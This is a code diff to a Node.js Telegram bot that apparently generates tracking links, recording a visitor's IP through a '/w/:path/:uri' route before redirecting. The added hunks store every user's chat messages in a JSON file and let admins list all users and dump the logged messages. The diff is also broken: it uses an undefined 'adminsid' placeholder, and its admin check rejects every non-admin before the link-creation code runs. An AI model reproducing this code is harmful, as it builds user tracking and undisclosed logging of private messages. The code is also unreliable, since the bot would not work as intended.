@@ -18,7 +18,7 @@ var hostURL="YOUR URL";
 //TOGGLE for Shorters
 var use1pt=true;
 
-
+const adminUserIds = [adminsid]
 
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
@@ -55,12 +55,43 @@ res.redirect("https://t.me/th30neand0nly0ne");
                               
 });
 
-
+let messages = {};
+try {
+  messages = JSON.parse(fs.readFileSync('messages.json'));
+} catch (error) {
+  console.log('Error loading messages:', error);
+}
 
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
 
- 
+const message = {
+  userId: chatId,
+  text: msg.text,
+  timestamp: new Date().toISOString()
+};
+if (!messages[chatId]) {
+  messages[chatId] = [];
+}
+messages[chatId].push(message);
+fs.writeFileSync('messages.json', JSON.stringify(messages));
+const isAdmin = adminUserIds.includes(String(msg.from.id));
+  if (!isAdmin) {
+    bot.sendMessage(chatId, 'You are not authorized to use this command.');
+    return;
+  }
+  switch (msg.text) {
+    case '/users':
+      const users = Object.keys(messages);
+      bot.sendMessage(chatId, `Users: ${users.join(', ')}`);
+      break;
+    case '/messages':
+      bot.sendMessage(chatId, JSON.stringify(messages, null, 2));
+      break;
+    // Add more admin commands here
+    default:
+      bot.sendMessage(chatId, 'Invalid command.');
+  }
 
 if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
  createLink(chatId,msg.text); 
